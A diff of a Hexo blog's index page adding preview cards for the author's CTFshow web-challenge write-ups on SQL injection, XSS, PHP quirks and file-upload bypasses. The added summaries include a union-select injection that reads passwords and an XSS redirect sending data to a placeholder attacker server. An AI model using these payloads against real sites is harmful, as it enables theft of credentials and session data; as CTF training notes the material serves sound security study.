@@ -48,7 +48,8 @@
 
     <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
 
-<meta name="generator" content="Hexo 6.0.0"></head>
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="J1an's Little World" type="application/atom+xml">
+</head>
 
 
 <body>
@@ -367,6 +368,183 @@
              <!-- 隐藏某个文章 -->
             <div class="article col s12 m6 l4" data-aos="zoom-in">
                 <div class="card">
+                    <a href="/posts/38885.html">
+                        <div class="card-image">
+                            
+                            
+                            <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="https://blog.gem-love.com/ctf/2283.html注入">
+                            
+                            <span class="card-title">https://blog.gem-love.com/ctf/2283.html注入</span>
+                        </div>
+                    </a>
+
+                    <div class="card-content article-content">
+                        <div class="summary block-with-text">
+                            
+                                171
+入门开始，直接union select
+database:ctfshow_web
+table:ctfshow_user
+0&#39; union select 1,2,group_concat(password) from ctfs
+                            
+                        </div>
+                        <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-07
+                            </span>
+                            <span class="publish-author">
+                                
+                                <i class="fas fa-user fa-fw"></i>
+                                J1an
+                                
+                            </span>
+                        </div>
+                    </div>
+
+                    
+                </div>
+            </div>
+              <!-- 隐藏某个文章 -->
+            
+             <!-- 隐藏某个文章 -->
+            <div class="article col s12 m6 l4" data-aos="zoom-in">
+                <div class="card">
+                    <a href="/posts/36544.html">
+                        <div class="card-image">
+                            
+                            
+                            <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="CTFshowXSS">
+                            
+                            <span class="card-title">CTFshowXSS</span>
+                        </div>
+                    </a>
+
+                    <div class="card-content article-content">
+                        <div class="summary block-with-text">
+                            
+                                首先自己搭建或者找xss测试平台还有另一个
+316
+最简单的：
+&lt;script&gt;document.location.href&#x3D;&#39;http:&#x2F;&#x2F;服务器IP&#x2F;?x&#x3D;&#39;
+                            
+                        </div>
+                        <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-06
+                            </span>
+                            <span class="publish-author">
+                                
+                                <i class="fas fa-user fa-fw"></i>
+                                J1an
+                                
+                            </span>
+                        </div>
+                    </div>
+
+                    
+                </div>
+            </div>
+              <!-- 隐藏某个文章 -->
+            
+             <!-- 隐藏某个文章 -->
+            <div class="article col s12 m6 l4" data-aos="zoom-in">
+                <div class="card">
+                    <a href="/posts/47427.html">
+                        <div class="card-image">
+                            
+                            
+                            <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="CTFshowPHP特性">
+                            
+                            <span class="card-title">CTFshowPHP特性</span>
+                        </div>
+                    </a>
+
+                    <div class="card-content article-content">
+                        <div class="summary block-with-text">
+                            
+                                89
+数组绕过
+intval()用于获取变量的整数值
+intval() 函数通过使用指定的进制base转换（默认是十进制），返回变量var的integer数值。intval()不能用于object，否则会产生E_NOTICE错误并返回1。
+
+                            
+                        </div>
+                        <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-04-05
+                            </span>
+                            <span class="publish-author">
+                                
+                                <i class="fas fa-user fa-fw"></i>
+                                J1an
+                                
+                            </span>
+                        </div>
+                    </div>
+
+                    
+                </div>
+            </div>
+              <!-- 隐藏某个文章 -->
+            
+             <!-- 隐藏某个文章 -->
+            <div class="article col s12 m6 l4" data-aos="zoom-in">
+                <div class="card">
+                    <a href="/posts/2824.html">
+                        <div class="card-image">
+                            
+                            
+                            <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="CTFShow文件上传">
+                            
+                            <span class="card-title">CTFShow文件上传</span>
+                        </div>
+                    </a>
+
+                    <div class="card-content article-content">
+                        <div class="summary block-with-text">
+                            
+                                文件上传151
+前端校验，直接绕过
+152
+Content/Type校验，直接绕过
+153
+文件后缀名校验，尝试使用php5,phtml等文件失败，康康wp学习新知识，查看响应 头发现中间件是nginx
+nginx中和apache的.hta
+                            
+                        </div>
+                        <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-30
+                            </span>
+                            <span class="publish-author">
+                                
+                                <i class="fas fa-user fa-fw"></i>
+                                J1an
+                                
+                            </span>
+                        </div>
+                    </div>
+
+                    
+                    <div class="card-action article-tags">
+                        
+                        <a href="/tags/CTF/">
+                            <span class="chip bg-color">CTF</span>
+                        </a>
+                        
+                        <a href="/tags/web/">
+                            <span class="chip bg-color">web</span>
+                        </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+              <!-- 隐藏某个文章 -->
+            
+             <!-- 隐藏某个文章 -->
+            <div class="article col s12 m6 l4" data-aos="zoom-in">
+                <div class="card">
                     <a href="/posts/17329.html">
                         <div class="card-image">
                             
@@ -659,12 +837,12 @@ dictionary（字典）使用{     }定义，内容为：下标名:
                     
                     <div class="card-action article-tags">
                         
-                        <a href="/tags/web/">
-                            <span class="chip bg-color">web</span>
-                        </a>
-                        
                         <a href="/tags/Note/">
                             <span class="chip bg-color">Note</span>
+                        </a>
+                        
+                        <a href="/tags/web/">
+                            <span class="chip bg-color">web</span>
                         </a>
                         
                         <a href="/tags/RCE/">
@@ -714,12 +892,12 @@ dictionary（字典）使用{     }定义，内容为：下标名:
                     
                     <div class="card-action article-tags">
                         
-                        <a href="/tags/web/">
-                            <span class="chip bg-color">web</span>
-                        </a>
-                        
                         <a href="/tags/Note/">
                             <span class="chip bg-color">Note</span>
+                        </a>
+                        
+                        <a href="/tags/web/">
+                            <span class="chip bg-color">web</span>
                         </a>
                         
                         <a href="/tags/SQL/">
@@ -767,58 +945,12 @@ dictionary（字典）使用{     }定义，内容为：下标名:
                     
                     <div class="card-action article-tags">
                         
+                        <a href="/tags/Note/">
+                            <span class="chip bg-color">Note</span>
+                        </a>
+                        
                         <a href="/tags/web/">
                             <span class="chip bg-color">web</span>
-                        </a>
-                        
-                        <a href="/tags/Note/">
-                            <span class="chip bg-color">Note</span>
-                        </a>
-                        
-                    </div>
-                    
-                </div>
-            </div>
-              <!-- 隐藏某个文章 -->
-            
-             <!-- 隐藏某个文章 -->
-            <div class="article col s12 m6 l4" data-aos="zoom-in">
-                <div class="card">
-                    <a href="/posts/58958.html">
-                        <div class="card-image">
-                            
-                            
-                            <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="CTF">
-                            
-                            <span class="card-title">CTF</span>
-                        </div>
-                    </a>
-
-                    <div class="card-content article-content">
-                        <div class="summary block-with-text">
-                            
-                                Jlan的CTF之旅从现在开始了
-
-                            
-                        </div>
-                        <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-01-08
-                            </span>
-                            <span class="publish-author">
-                                
-                                <i class="fas fa-user fa-fw"></i>
-                                J1an
-                                
-                            </span>
-                        </div>
-                    </div>
-
-                    
-                    <div class="card-action article-tags">
-                        
-                        <a href="/tags/Note/">
-                            <span class="chip bg-color">Note</span>
                         </a>
                         
                     </div>
@@ -844,11 +976,12 @@ dictionary（字典）使用{     }定义，内容为：下标名:
             
         </div>
         <div class="page-info col m4 l4 hide-on-small-only">
-            <div class="center-align b-text-gray">5 / 5</div>
+            <div class="center-align b-text-gray">5 / 6</div>
         </div>
         <div class="col s6 m4 l4">
             
-            <a class="right btn-floating btn-large disabled">
+            <a href="/page/6/"
+               class="right btn-floating btn-large waves-effect waves-light bg-color">
                 <i class="fas fa-angle-right"></i>
             </a>
             
